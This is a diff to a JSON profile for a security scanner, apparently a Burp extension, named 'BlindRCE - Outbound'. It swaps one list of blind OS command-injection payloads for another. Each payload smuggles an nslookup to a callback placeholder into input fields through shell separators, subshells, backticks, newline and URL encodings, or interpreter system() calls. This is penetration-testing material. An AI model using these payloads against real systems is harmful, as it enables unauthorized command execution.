@@ -1,6 +1,6 @@
 [
   {
-    "ProfileName": "BlindRCE - outbound",
+    "ProfileName": "BlindRCE - Outbound",
     "Name": "",
     "Enabled": true,
     "Scanner": 1,
@@ -152,17 +152,21 @@
       "true,`nslookup {BC} \u003e /dev/null`",
       "true,; $(nslookup {BC})",
       "true,; $(nslookup${IFS}{BC})",
-      "true,; eval \"nslookup${IFS}{BC}\"",
-      "true,; function f() { nslookup {BC}; }; f",
-      "true,; alias n\u003dnslookup; n {BC}",
-      "true,; setsid nslookup {BC}",
-      "true,; nohup nslookup {BC} \u0026",
-      "true,; screen -d -m nslookup {BC}",
-      "true,; (exec nslookup {BC})",
-      "true,; perl -e \u0027system(\"nslookup {BC}\")\u0027",
-      "true,; python -c \u0027import os; os.system(\"nslookup {BC}\")\u0027",
-      "true,; php -r \u0027system(\"nslookup {BC}\");\u0027",
-      "true,; ruby -e \u0027system(\"nslookup {BC}\")\u0027"
+      "true,\\n nslookup {BC}",
+      "true,\\n;nslookup {BC}",
+      "true,\\n%0a nslookup {BC}",
+      "true,\\n%0a;nslookup {BC}",
+      "true,\\n $(nslookup {BC})",
+      "true,\\n%0a $(nslookup {BC})",
+      "true,\\n `nslookup {BC}`",
+      "true,\\n%0a `nslookup {BC}`",
+      "true,\\n nslookup${IFS}{BC}",
+      "true,\\n%0a nslookup${IFS}{BC}",
+      "true,\\n;nslookup${IFS}{BC};%0a",
+      "true,\\n%0a;nslookup${IFS}{BC};%0a",
+      "true,\\n \"nslookup {BC}\"",
+      "true,\\n%0a \"nslookup {BC}\"",
+      "true,\\n \u0027nslookup {BC}\u0027"
     ],
     "Encoder": [
       "URL-encode key characters"
